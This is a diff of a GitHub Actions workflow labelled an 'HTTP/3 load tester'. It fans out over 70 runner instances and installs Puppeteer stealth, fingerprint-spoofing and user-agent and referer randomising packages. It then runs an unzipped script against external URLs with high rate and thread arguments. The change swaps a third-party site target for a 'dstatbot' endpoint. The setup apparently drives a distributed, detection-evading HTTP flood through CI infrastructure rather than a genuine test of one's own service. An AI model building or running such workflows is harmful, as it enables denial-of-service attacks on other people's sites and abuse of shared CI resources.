@@ -33,15 +33,14 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install puppeteer puppeteer-real-browser fingerprint-generator axios chalk@4 colors request user-agents random-referer hpack
+        run: npm install puppeteer puppeteer-real-browser fingerprint-generator axios chalk@4 colors request user-agents random-referer hpack puppeteer-extra puppeteer puppeteer-extra-plugin-stealth puppeteer-extra-plugin-anonymize-ua puppeteer-extra-plugin-adblocker
             
       - name: Run HTTP/3 load tester
         run: |
-          git clone https://github.com/Fegp1p2/ideal-guide.git
-          cd ideal-guide
-          unzip Fc-main.zip
-          cd Fc-main
-          node y.js GET https://rebranders.ai-new.xyz/terms.php 700 4 90 --full --bfw --debug 
+          
+          unzip m.zip
+          cd m
+          node m.js https://captcha.dstatbot.win/hNFAjCwd 700 64
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
